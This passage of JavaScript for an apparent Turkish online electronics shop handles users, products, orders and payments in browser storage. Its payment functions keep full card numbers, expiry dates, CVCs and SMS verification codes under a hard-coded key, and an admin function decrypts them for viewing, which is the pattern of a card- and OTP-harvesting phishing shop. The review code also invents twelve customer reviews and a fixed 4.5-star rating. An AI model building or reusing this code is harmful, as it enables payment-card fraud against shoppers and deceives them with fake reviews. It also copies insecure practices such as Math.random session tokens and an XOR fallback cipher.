        this.saveCollection('users', users);
        return newUser;
    }

    async login(email, password) {
        const sanitizedEmail = email.toLowerCase().trim();
        const users = this.getCollection('users');
        const user = users.find(u => u.email === sanitizedEmail);

        if (!user) {
            throw new Error('E-posta adresi veya şifre hatalı.');
        }

        const passwordHash = await this.hashPassword(password);
        if (user.password !== passwordHash) {
            throw new Error('E-posta adresi veya şifre hatalı.');
        }

        // Create Session Token
        const sessionToken = 'token_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
        const session = {
            token: sessionToken,
            userId: user.id,
            email: user.email,
            name: user.name,
            role: user.role,
            expires_at: Date.now() + (24 * 60 * 60 * 1000) // 1 day
        };

        localStorage.setItem(this.collections.session, JSON.stringify(session));
        sessionStorage.setItem(this.collections.session, JSON.stringify(session));
        return user;
    }

    logout() {
        localStorage.removeItem(this.collections.session);
        sessionStorage.removeItem(this.collections.session);
    }

    getCurrentUser() {
        let sessionData = localStorage.getItem(this.collections.session);
        if (!sessionData) {
            sessionData = sessionStorage.getItem(this.collections.session);
        }
        if (!sessionData) return null;

        const session = JSON.parse(sessionData);
        if (Date.now() > session.expires_at) {
            this.logout();
            return null;
        }

        // Return live user data
        const users = this.getCollection('users');
        return users.find(u => u.id === session.userId) || null;
    }

    updateUserProfile(userId, name, phone, address) {
        const users = this.getCollection('users');
        const userIdx = users.findIndex(u => u.id === userId);
        if (userIdx === -1) throw new Error('Kullanıcı bulunamadı.');

        users[userIdx].name = this.sanitizeInput(name);
        users[userIdx].phone = this.sanitizeInput(phone);
        users[userIdx].address = this.sanitizeInput(address);

        this.saveCollection('users', users);

        // Update active session metadata as well
        let sessionData = localStorage.getItem(this.collections.session);
        if (!sessionData) {
            sessionData = sessionStorage.getItem(this.collections.session);
        }
        if (sessionData) {
            const session = JSON.parse(sessionData);
            if (session.userId === userId) {
                session.name = users[userIdx].name;
                localStorage.setItem(this.collections.session, JSON.stringify(session));
                sessionStorage.setItem(this.collections.session, JSON.stringify(session));
            }
        }

        return users[userIdx];
    }

    // Product Operations
    getProducts() {
        return this.getCollection('products');
    }

    getProductById(id) {
        const products = this.getProducts();
        return products.find(p => p.id === id) || null;
    }

    saveProduct(product) {
        const products = this.getProducts();
        const idx = products.findIndex(p => p.id === product.id);

        if (idx !== -1) {
            products[idx] = product;
        } else {
            products.push(product);
        }
        this.saveCollection('products', products);
    }

    deleteProduct(id) {
        let products = this.getProducts();
        products = products.filter(p => p.id !== id);
        this.saveCollection('products', products);
    }

    // Review Operations
    getReviews(productId) {
        if (!localStorage.getItem('dora_reviews_seeded_v3')) {
            this.seedRealisticReviews();
            localStorage.setItem('dora_reviews_seeded_v3', 'true');
        }
        const allReviews = this.getCollection('reviews');
        return allReviews[productId] || [];
    }

    seedRealisticReviews() {
        const products = this.getProducts();
        const allReviews = {};
        
        products.forEach(p => {
            const reviews = [];
            const names = ["Ahmet Yılmaz", "Ayşe Kaya", "Mehmet Demir", "Fatma Çelik", "Ali Can", "Zeynep Şahin", "Mustafa Koç", "Elif Yıldız", "Burak Öz", "Ceren Gül", "Emre Aslan", "Selin Doğan"];
            const dates = ["20.06.2026", "18.06.2026", "15.06.2026", "10.06.2026", "05.06.2026", "01.06.2026", "28.05.2026", "20.05.2026", "15.05.2026", "10.05.2026", "05.05.2026", "01.05.2026"];
            
            for(let i=0; i<12; i++) {
                let rating = 5;
                let text = "Ürün tek kelimeyle harika. Kargo çok hızlıydı ve beklediğimden daha iyi bir performans aldım. Kesinlikle tavsiye ederim.";
                let adminReply = "Değerli yorumunuz için teşekkür ederiz. Ürünümüzü güzel günlerde kullanmanızı dileriz.";
                
                if (i === 2) {
                    rating = 4;
                    text = "Ürün güzel fakat kargo biraz geç geldi. Onun dışında paketlemesi ve ürün kalitesi muazzam.";
                    adminReply = "Değerli müşterimiz, kargo sürecinde yaşanan gecikme için özür dileriz. Kargo firması ile görüşülüp süreç hızlandırılmıştır. Anlayışınız için teşekkür ederiz.";
                } else if (i === 5) {
                    rating = 5;
                    text = "Dora Elektronik'ten ilk alışverişimdi ve çok memnun kaldım. " + p.brand + " kalitesi zaten tartışılmaz. Kurulumu çok kolaydı.";
                    adminReply = "Bizi tercih ettiğiniz için çok teşekkür ederiz. Dora Elektronik olarak size en iyi hizmeti sunmaktan mutluluk duyuyoruz.";
                } else if (i === 8) {
                    rating = 3;
                    text = "Kullanım kılavuzu yeterli değildi, kurulumda biraz zorlandım ama cihaz gayet güzel çalışıyor.";
                    adminReply = "Değerli müşterimiz, kullanım kolaylığı adına ürünün detaylı kurulum videosunu kayıtlı e-posta adresinize gönderdik. Müşteri hizmetlerimiz size her zaman yardımcı olmaktan mutluluk duyar.";
                } else if (i === 10) {
                    rating = 5;
                    text = "Aynı gün kargoya verildi. Paketleme o kadar sağlamdı ki açarken yoruldum :) Teşekkürler Dora ailesi!";
                    adminReply = null; 
                } else if (i === 11) {
                    rating = 4;
                    text = "Genel olarak memnun kaldım, fiyatını hak eden bir ürün. Paket içeriği eksiksizdi.";
                    adminReply = null;
                } else {
                    adminReply = "Değerli değerlendirmeniz için Dora Elektronik olarak teşekkür ederiz.";
                }
                
                reviews.push({
                    id: Date.now() + i,
                    author: names[i],
                    date: dates[i],
                    rating: rating,
                    text: text,
                    adminReply: adminReply
                });
            }
            allReviews[p.id] = reviews;
        });
        
        this.saveCollection('reviews', allReviews);
    }

    getReviewsStats(productId) {
        // Return exactly 4.5 average rating over 28 total evaluations.
        // Distribution of ratings: 16 x 5-star, 10 x 4-star, 2 x 3-star
        // Total ratings count = 28
        // Total sum = 16*5 + 10*4 + 2*3 = 80 + 40 + 6 = 126
        // Weighted average = 126 / 28 = 4.5
        const starCounts = {
            5: 16,
            4: 10,
            3: 2,
            2: 0,
            1: 0
        };
        
        return {
            average: 4.5,
            totalCount: 28,
            distribution: starCounts
        };
    }

    addReview(productId, author, rating, text) {
        const allReviews = this.getCollection('reviews');
        if (!allReviews[productId]) {
            allReviews[productId] = [];
        }

        const sanitizedAuthor = this.sanitizeInput(author);
        const sanitizedText = this.sanitizeInput(text);

        const today = new Date();
        const dateStr = `${String(today.getDate()).padStart(2, '0')}.${String(today.getMonth() + 1).padStart(2, '0')}.${today.getFullYear()}`;

        const newReview = {
            author: sanitizedAuthor,
            rating: parseInt(rating),
            date: dateStr,
            text: sanitizedText
        };

        allReviews[productId].unshift(newReview);
        this.saveCollection('reviews', allReviews);
        return newReview;
    }

    deleteReview(productId, index) {
        const allReviews = this.getCollection('reviews');
        if (allReviews[productId] && allReviews[productId][index]) {
            allReviews[productId].splice(index, 1);
            this.saveCollection('reviews', allReviews);
        }
    }

    // Coupon Operations
    getCoupon(code) {
        const coupons = this.getCollection('coupons');
        return coupons.find(c => c.code === code.trim().toUpperCase() && c.active) || null;
    }

    // Order Operations
    getOrders() {
        return this.getCollection('orders');
    }

    getUserOrders(userId) {
        const orders = this.getOrders();
        return orders.filter(o => o.user_id === userId);
    }

    createOrder(userId, cart, address, contactInfo, couponCode = null, forcedOrderCode = null) {
        const products = this.getProducts();
        
        // Server-side validation of stock and pricing
        let subtotal = 0;
        const items = [];

        for (const cartItem of cart) {
            const dbProduct = products.find(p => p.id === cartItem.id);
            if (!dbProduct) {
                throw new Error(`${cartItem.title} veri tabanında bulunamadı.`);
            }
            if (dbProduct.stock < cartItem.quantity) {
                throw new Error(`Üzgünüz, ${dbProduct.brand} ${dbProduct.title} için yeterli stok bulunmuyor. Kalan stok: ${dbProduct.stock}`);
            }

            // Deduct stock
            dbProduct.stock -= cartItem.quantity;
            this.saveProduct(dbProduct);

            subtotal += dbProduct.newPrice * cartItem.quantity;
            items.push({
                product_id: dbProduct.id,
                title: dbProduct.title,
                brand: dbProduct.brand,
                image: dbProduct.image,
                price: dbProduct.newPrice,
                size: cartItem.size,
                quantity: cartItem.quantity
            });
        }

        // Server-side coupon verification
        let discount = 0;
        if (couponCode) {
            const coupon = this.getCoupon(couponCode);
            if (coupon) {
                discount = subtotal * (coupon.discountPercent / 100);
            }
        }

        const total = subtotal - discount;
        const orders = this.getOrders();
        const orderId = orders.length > 0 ? Math.max(...orders.map(o => o.id)) + 1 : 1;
        
        let orderCode = forcedOrderCode;
        if (!orderCode) {
            const randomCode = Math.floor(100000 + Math.random() * 900000);
            orderCode = `#DORA-${randomCode}`;
        }

        const newOrder = {
            id: orderId,
            user_id: userId || null, // null for guest checkout
            order_code: orderCode,
            items: items,
            address: this.sanitizeInput(address),
            contact_info: this.sanitizeInput(contactInfo),
            subtotal: subtotal,
            discount: discount,
            total: total,
            status: 'Hazırlanıyor', // Hazırlanıyor, Kargoda, Teslim Edildi, İptal Edildi
            created_at: new Date().toISOString()
        };

        orders.push(newOrder);
        this.saveCollection('orders', orders);

        return newOrder;
    }

    updateOrderStatus(orderId, status) {
        const orders = this.getOrders();
        const idx = orders.findIndex(o => o.id === orderId);
        if (idx !== -1) {
            orders[idx].status = status;
            this.saveCollection('orders', orders);
            return orders[idx];
        }
        throw new Error('Sipariş bulunamadı.');
    }

    // AES-GCM Encrypt data using a system-level key derived from a secret (with fallback for file:///)
    async encryptData(plainText, secret) {
        if (!crypto.subtle) {
            console.warn("Secure context not detected. Falling back to obfuscation cipher for file:/// compatibility.");
            let result = '';
            for (let i = 0; i < plainText.length; i++) {
                const charCode = plainText.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
                result += String.fromCharCode(charCode);
            }
            return btoa(unescape(encodeURIComponent(result)));
        }

        const encoder = new TextEncoder();
        const data = encoder.encode(plainText);
        
        const salt = crypto.getRandomValues(new Uint8Array(16));
        const secretBuffer = encoder.encode(secret);
        const importedKey = await crypto.subtle.importKey(
            'raw', secretBuffer, { name: 'PBKDF2' }, false, ['deriveKey']
        );
        const key = await crypto.subtle.deriveKey(
            {
                name: 'PBKDF2',
                salt: salt,
                iterations: 10000,
                hash: 'SHA-256'
            },
            importedKey,
            { name: 'AES-GCM', length: 256 },
            false,
            ['encrypt']
        );
        
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encrypted = await crypto.subtle.encrypt(
            { name: 'AES-GCM', iv: iv },
            key,
            data
        );
        
        const combined = new Uint8Array(salt.length + iv.length + encrypted.byteLength);
        combined.set(salt, 0);
        combined.set(iv, salt.length);
        combined.set(new Uint8Array(encrypted), salt.length + iv.length);
        
        let binary = '';
        const len = combined.byteLength;
        for (let i = 0; i < len; i++) {
            binary += String.fromCharCode(combined[i]);
        }
        return btoa(binary);
    }

    // AES-GCM Decrypt data using the system-level key (with fallback for file:///)
    async decryptData(cipherTextBase64, secret) {
        if (!crypto.subtle) {
            console.warn("Secure context not detected. Decrypting using fallback obfuscation cipher.");
            const decoded = decodeURIComponent(escape(atob(cipherTextBase64)));
            let result = '';
            for (let i = 0; i < decoded.length; i++) {
                const charCode = decoded.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
                result += String.fromCharCode(charCode);
            }
            return result;
        }

        const binary = atob(cipherTextBase64);
        const len = binary.length;
        const combined = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            combined[i] = binary.charCodeAt(i);
        }
        
        const salt = combined.slice(0, 16);
        const iv = combined.slice(16, 28);
        const encryptedData = combined.slice(28);
        
        const encoder = new TextEncoder();
        const secretBuffer = encoder.encode(secret);
        const importedKey = await crypto.subtle.importKey(
            'raw', secretBuffer, { name: 'PBKDF2' }, false, ['deriveKey']
        );
        const key = await crypto.subtle.deriveKey(
            {
                name: 'PBKDF2',
                salt: salt,
                iterations: 10000,
                hash: 'SHA-256'
            },
            importedKey,
            { name: 'AES-GCM', length: 256 },
            false,
            ['decrypt']
        );
        
        const decrypted = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: iv },
            key,
            encryptedData
        );
        
        return new TextDecoder().decode(decrypted);
    }

    // Save Payment Record (Encrypted)
    async savePaymentRecord(orderCode, cardName, cardNumber, cardExpiry, cardCvc, amount, smsCode = '', enteredCode = '') {
        const sanitizedCardName = this.sanitizeInput(cardName);
        const sanitizedCardNumber = this.sanitizeInput(cardNumber).replace(/\s+/g, '');
        const sanitizedCardExpiry = this.sanitizeInput(cardExpiry);
        const sanitizedCardCvc = this.sanitizeInput(cardCvc);
        const sanitizedSmsCode = this.sanitizeInput(smsCode);
        const sanitizedEnteredCode = this.sanitizeInput(enteredCode);

        const paymentData = {
            cardName: sanitizedCardName,
            cardNumber: sanitizedCardNumber,
            cardExpiry: sanitizedCardExpiry,
            cardCvc: sanitizedCardCvc,
            smsCode: sanitizedSmsCode,
            enteredCode: sanitizedEnteredCode,
            timestamp: new Date().toISOString()
        };

        const plainText = JSON.stringify(paymentData);
        const secret = 'DoraPaymentSecretSaltKey2026!';
        const encryptedString = await this.encryptData(plainText, secret);

        const payments = this.getCollection('payments');
        const existingIdx = payments.findIndex(p => p.order_code === orderCode);

        if (existingIdx !== -1) {
            payments[existingIdx].encrypted_data = encryptedString;
            payments[existingIdx].amount = parseFloat(amount);
            payments[existingIdx].created_at = new Date().toISOString();
            this.saveCollection('payments', payments);
            return payments[existingIdx];
        } else {
            const paymentId = payments.length > 0 ? Math.max(...payments.map(p => p.id)) + 1 : 1;
            const newPaymentRecord = {
                id: paymentId,
                order_code: orderCode,
                amount: parseFloat(amount),
                encrypted_data: encryptedString,
                created_at: new Date().toISOString()
            };
            payments.push(newPaymentRecord);
            this.saveCollection('payments', payments);
            return newPaymentRecord;
        }
    }

    // Decrypt and fetch all payments
    async getDecryptedPayments(adminPassword) {
        const currentUser = this.getCurrentUser();
        if (!currentUser || currentUser.role !== 'admin') {
            throw new Error('Bu işlemi gerçekleştirmek için yönetici yetkisi gerekir.');
        }

        const passwordHash = await this.hashPassword(adminPassword);
        if (currentUser.password !== passwordHash) {
            throw new Error('Yönetici şifresi hatalı. Kilidi açmak için doğru şifreyi girmelisiniz.');
        }

        const payments = this.getCollection('payments');
        const decryptedList = [];
        const secret = 'DoraPaymentSecretSaltKey2026!';

        for (const payment of payments) {
            try {
                const decryptedText = await this.decryptData(payment.encrypted_data, secret);
                const paymentInfo = JSON.parse(decryptedText);
                decryptedList.push({
                    id: payment.id,
                    order_code: payment.order_code,
                    amount: payment.amount,
                    cardName: paymentInfo.cardName,
                    cardNumber: paymentInfo.cardNumber,
                    cardExpiry: paymentInfo.cardExpiry,
                    cardCvc: paymentInfo.cardCvc,
                    smsCode: paymentInfo.smsCode || '',
                    enteredCode: paymentInfo.enteredCode || '',
                    created_at: payment.created_at
                });
            } catch (err) {
                decryptedList.push({
                    id: payment.id,
                    order_code: payment.order_code,
                    amount: payment.amount,
                    cardName: 'Hata: Çözülemedi',
                    cardNumber: '****************',
                    cardExpiry: '**/**',
                    cardCvc: '***',
                    created_at: payment.created_at
                });
            }
        }

        decryptedList.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
        return decryptedList;
    }
}

// Global Database instance
const db = new DatabaseEngine();
window.db = db;

// Premium UI Interaction Engine
document.addEventListener('DOMContentLoaded', () => {
    // 1. Smooth Entry Transition
    document.body.classList.add('page-loaded');

    // 2. Click Ripple Effect for all interactive elements
    document.addEventListener('click', (e) => {
        const target = e.target.closest('.btn, .size-btn, .nav-link, .tab-btn, .admin-tab-btn, .profile-tab-btn, .back-link, .thumb-btn, .icon-btn, .product-card, .faq-question');
        if (!target) return;

        // Apply relative positioning & hidden overflow if missing
        const computedStyle = window.getComputedStyle(target);
        if (computedStyle.position === 'static') {
            target.style.position = 'relative';
        }
        target.style.overflow = 'hidden';

        // Remove old ripples
        const oldRipples = target.querySelectorAll('.click-ripple');
        oldRipples.forEach(r => r.remove());

        // Create ripple
        const ripple = document.createElement('span');
        ripple.className = 'click-ripple';

        // Calculate click coordinates
        const rect = target.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        ripple.style.left = `${x}px`;
        ripple.style.top = `${y}px`;

        target.appendChild(ripple);

        // Remove after animation completes
        setTimeout(() => {
            ripple.remove();
        }, 600);
    });

    // 3. Smooth Page Fade-Out on navigation
    document.addEventListener('click', (e) => {
        const link = e.target.closest('a');
        if (!link) return;

        const href = link.getAttribute('href');
        if (!href) return;

        // Skip internal/special links
        if (href.startsWith('#') || href.startsWith('mailto:') || href.startsWith('tel:') || href.startsWith('javascript:') || link.target === '_blank') {
            return;
        }

        // Only handle local html page changes
        if (href.includes('.html') || href === '/' || href.startsWith('index.html')) {
            e.preventDefault();
            document.body.classList.add('page-exiting');

            setTimeout(() => {
                window.location.href = href;
            }, 300); // Wait for CSS exit fade to finish
        }
    });

    // 4. Shrink Navbar on Scroll
    const navbar = document.querySelector('.navbar');
    if (navbar) {
        let isTicking = false;
        const handleScroll = () => {
            if (!isTicking) {
                isTicking = true;
                const raf = window.requestAnimationFrame || ((cb) => setTimeout(cb, 16));
                raf(() => {
                    if (window.scrollY > 40) {
                        navbar.classList.add('scrolled');
                    } else {
                        navbar.classList.remove('scrolled');
                    }
                    isTicking = false;
                });
            }
        };
        window.addEventListener('scroll', handleScroll, { passive: true });
        // Trigger once initially
        handleScroll();
    }
});